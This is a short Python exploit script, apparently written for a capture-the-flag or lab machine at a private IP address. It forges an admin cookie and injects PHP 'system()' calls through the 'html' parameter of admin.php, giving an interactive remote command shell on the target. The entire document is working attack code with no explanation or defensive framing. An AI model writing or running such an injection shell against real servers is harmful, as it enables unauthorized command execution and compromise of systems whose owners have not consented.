import requests, urllib.parse

headers = {"Connection": "keep-alive", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36"}
cookies = {"adminpowa": "noonecares"}

while True:
	url = "http://10.10.10.27/admin.php?html="+urllib.parse.quote("<?php system(\""+str(input("$ "))+"\"); ?>")
	cmd = False
	for line in requests.get(url, headers=headers, cookies=cookies).text.splitlines():
		if cmd == True:
			print(line)
		if "</body></html>" in line:
                        cmd = True

